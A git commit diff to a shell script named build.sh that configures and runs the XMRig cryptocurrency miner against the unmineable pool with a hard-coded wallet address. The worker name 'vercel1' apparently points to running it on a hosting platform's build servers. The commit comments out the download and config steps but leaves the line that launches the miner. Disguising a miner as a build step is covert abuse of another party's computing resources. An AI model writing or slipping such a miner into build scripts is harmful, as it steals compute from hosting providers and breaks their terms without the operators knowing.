a3b4d4aec01fbeb164eb2bd7da788b008c3ecc07
alexandro591 <alexandrotapiaflores@gmail.com>
2021-12-27 14:49:48 -0500

    update

--- build.sh
+++ build.sh
@@ -2,18 +2,18 @@ VERSION="6.16.2"
 URL_MINING="rx.unmineable.com:3333"
 USER_MINING="SAITAMA:0x975253A0eC2822fAe58f49630e38E57aa2aAB840.vercel1"
 
-wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz
-tar -xf xmrig-${VERSION}-linux-x64.tar.gz
+# wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz
+# tar -xf xmrig-${VERSION}-linux-x64.tar.gz
 
-rm -f -r xmrig
-mkdir xmrig
+# rm -f -r xmrig
+# mkdir xmrig
 
-cp xmrig-${VERSION}/xmrig xmrig/xmrig 
-cp config.json xmrig/config.json
+# cp xmrig-${VERSION}/xmrig xmrig/xmrig 
+# cp config.json xmrig/config.json
 
-rm -f -r xmrig-${VERSION} xmrig-${VERSION}-linux-x64.tar.gz
+# rm -f -r xmrig-${VERSION} xmrig-${VERSION}-linux-x64.tar.gz
 
-sed -i "/\"url\": \"URL\",/c\\\"url\": \"${URL_MINING}\"," xmrig/config.json
-sed -i "/\"user\": \"USER\",/c\\\"user\": \"${USER_MINING}\"," xmrig/config.json
+# sed -i "/\"url\": \"URL\",/c\\\"url\": \"${URL_MINING}\"," xmrig/config.json
+# sed -i "/\"user\": \"USER\",/c\\\"user\": \"${USER_MINING}\"," xmrig/config.json
 
 ./xmrig/xmrig
